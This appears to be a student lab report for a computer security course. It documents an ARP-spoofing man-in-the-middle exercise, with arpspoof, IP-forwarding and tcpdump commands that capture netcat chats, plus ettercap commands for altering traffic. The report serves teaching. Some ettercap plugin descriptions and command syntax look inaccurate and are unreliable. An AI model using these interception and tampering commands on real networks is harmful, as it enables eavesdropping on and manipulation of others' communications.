@@ -1,0 +1,100 @@
+CMSC 626 Principles of Computer Security
+Project 2
+Exercise 7
+
+
+1.
+
+a.	Team Information:
+
+	i.	Name: Faisal Rasheed Khan	University Id: VB02734
+	ii.	Name: Shrenik PolySetty		University Id: AZ61492
+
+b.	sudo arpspoof -i eth1 -t 133.228.98.2 -r 133.228.98.3
+	sudo arpspoof -i eth1 -t 133.228.81.2 -r 133.228.81.3
+	sudo arpspoof -i eth1 -t 133.228.98.2 -r 133.228.81.3
+	sudo tcpdump -i eth1 -n -w arp.pcap 'host 133.228.98.2 and host 133.228.98.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'
+	sudo tcpdump -i eth1 -n -w arp.pcap 'host 133.228.81.2 and host 133.228.81.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'
+	sudo sysctl -w net.ipv4.ip_forward=1
+	tcpdump -nn -A -r arp.pcap tcp
+	cat arp.pcap
+	tshark -r arp.pcap -x
+ 	sudo tcpdump -nn -r arp.pcap tcp
+
+c.	nc 133.228.98.3 22222
+	nc -l 22222
+	nc 133.228.81.3 22222
+	
+
+d.	My name is Faisal Khan    from 133.228.98.2
+	Your Name is Faisal Khan  from 133.228.98.3
+	My Name is Shrenik	  from 133.228.81.2
+	Your Name is Shrenik  	  from 133.228.81.3
+
+e.	Packet number 9 & 10 has the communication data "My name is Faisal Khan" from 133.228.98.2
+	Packet number 112 & 114 has the communication data "Your Name is Faisal Khan" from 133.228.98.3
+	Packet number 9 & 10 has the communication data "My name is Shrenik" from 133.228.81.2
+	Packet number 95 & 97 has the communication data "Your Name is Shrenik" from 133.228.81.3
+
+	Yes there is a double capture of each chat text in tcpdump.
+	The double capture is because the attacker is monitoring both the communications by acting as Man in the Middle. The net cat sends 	the chat communicated from sender to receiver and 	the attacker captures both the senders chat and as well as receivers chat. Thats why double capture is there. Sometimes Fragmentation also leads to double capture.
+
+	
+f.	The tcpdump to capture only single chat text we can do it by just ensuring that the sender uses the netcat command but not. Using only at one side of netcat command doesnot establish 	the connection but the sender tries to send the message which will not be sent to receiver as the connection is not established, the attacker captures the chat whether the 	communication is established between sender and receiver is there or not.
+	Another way is, as the attacker acts as Man in the middle rather than sending the communication to receiver, the attacker redirects the communication to himself. tcpdump captures the 	data b/w sender and receiver(as provided in the tcpdump command) but not to 	the attacker. By this method it can capture only single chat text.
+	Another way is by ensuring that the packet size is such that it doesnt get fragmented, then the single capture will be there.
+
+g. 	Challenges:
+	
+	The netcat communication was not happening because of the previous excercise 6 was on firewall. Firewall was enabled and was blocking communication.
+	Resolved the issue by disabling the firewall using:sudo ufw disable
+
+	At the attackers side should run arpspoof and tcpdump continuously.
+	Resolved by doing both in separate terminals.
+
+	Some difficulty in finding which packet numbers communicated the message.
+	Resolved it by using various tcpdump and wireshark commands.
+
+	
+h.	Summary of our Learning:
+
+	By doing the exercise 7, we learned and applied our learnings with the Man in The Middle (MITM) attacks, Address Resolution Protocol (ARP). This exercise 7 also helps us the 	understanding and applications of network communication using netcat (nc). tcpdump (or wireshark) is used to capture and analyze packets. The main objective to complete is that the 	attacker eavesdrop the communication between two users . Both of us successfully understood and launched a MITM attack, where the attacker poisons the ARP tables of both machines and 	enables IP forwarding of IP packets. The attacker then starts the tcpdump to capture any communication between the two systems and uses a capture filter to capture TCP packets with 	data size greater than zero. Finally, the attacker stops the tcpdump, analyzes the capture, and identifies the chat text. Understood the MITM atacking by doing role reversal of our 	team.
+
+
+i.	References:
+
+https://tutorialedge.net/security/arp-spoofing-for-mitm-attack-tutorial/
+
+https://linux.die.net/man/8/tcpdump
+
+https://linux.die.net/man/1/nc
+
+https://linux.die.net/man/8/ettercap_plugins
+
+
+2.	tcpdump_arp_decoded_pcap.txt
+	tcpdump_arp_pcap.pcap
+	tcpdump_arp_packetnumber1.txt
+	tcpdump_arp_decoded_pcap2.txt
+	tcpdump_arp_pcap.pcap
+	tcpdump_arp_packetnumber2.txt
+
+
+Bonus Question:
+
+a.	Yes, we can modify the communication between the users. We can use ettercap, bettercap, MITF either of the above
+	I tried using ettercap but some of the plugins were not installed.
+		sudo ettercap -Tq -M arp:remote /133.228.98.2// /133.228.98.3// -P replace -T http -e 's/hi/hello/g'
+	Tried inserting the custom filter but it didnt work out
+			Filter:
+			if (ip.proto == TCP && tcp.dst == target-port && search(DATA.data, "hello")) {
+  				replace("hello", "world");
+			}
+		sudo ettercap -Tq -M arp:remote /133.228.98.2// /133.228.98.3// -F /home/crsuser/filter_ettercap.ef -T 133.228.98.3/80/
+
+b.	"dns_spoof": This plugin allows the attacker to modify DNS requests and responses, and redirect users to fake websites.
+	"msg_replace": This plugin replaces specific strings in packets. For example, it can be used to change the contents of an HTTP response.
+	"msg_inject": This plugin injects custom messages into packets. It can be used to inject malicious payloads or commands.
+	"remote_browser": This plugin opens a remote browser on the victim's machine and allows the attacker to control it.
+	Some of the above requires custom filters to define.
+	sudo ettercap -Tq -M arp:remote /133.228.98.2// /133.228.98.3// -P replace_string -T 133.228.98.3/80/ -e 's/old_text/new_text/g'
